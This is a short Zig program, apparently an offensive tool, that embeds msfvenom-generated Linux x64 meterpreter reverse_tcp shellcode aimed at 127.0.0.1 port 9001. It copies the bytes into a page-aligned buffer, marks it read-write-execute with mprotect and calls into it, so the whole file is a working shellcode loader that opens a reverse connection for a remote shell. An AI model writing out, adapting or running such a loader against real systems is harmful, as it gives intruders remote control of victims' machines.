const std = @import("std");

pub fn main() !void {
    @setRuntimeSafety(false);
    // msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=9001 LHOST=127.0.0.1 -f zig
    const buf: []const u8 = &.{ 0x31, 0xff, 0x6a, 0x09, 0x58, 0x99, 0xb6, 0x10, 0x48, 0x89, 0xd6, 0x4d, 0x31, 0xc9, 0x6a, 0x22, 0x41, 0x5a, 0x6a, 0x07, 0x5a, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x51, 0x6a, 0x0a, 0x41, 0x59, 0x50, 0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0x3b, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x23, 0x29, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x59, 0x48, 0x85, 0xc0, 0x79, 0x25, 0x49, 0xff, 0xc9, 0x74, 0x18, 0x57, 0x6a, 0x23, 0x58, 0x6a, 0x00, 0x6a, 0x05, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x0f, 0x05, 0x59, 0x59, 0x5f, 0x48, 0x85, 0xc0, 0x79, 0xc7, 0x6a, 0x3c, 0x58, 0x6a, 0x01, 0x5f, 0x0f, 0x05, 0x5e, 0x6a, 0x7e, 0x5a, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x78, 0xed, 0xff, 0xe6 };

    var arena = std.heap.ArenaAllocator.init(std.heap.page_allocator);
    defer arena.deinit();
    const allocator = arena.allocator();

    const code = try allocator.alloc(u8, std.mem.page_size);
    var pcode = std.mem.alignInSlice(code, std.mem.page_size) orelse return;

    @memcpy(pcode, buf);

    const p = @as([*]const u8, @ptrCast(pcode));

    if (0 != std.os.linux.mprotect(p, std.mem.page_size, 7)) { // RWX
        return;
    }
    const intFuncPtr: usize = @intFromPtr(&pcode[0]);
    const funcPtr1: *const fn () void = @as(*const fn () void, @ptrFromInt(intFuncPtr));
    funcPtr1();
}
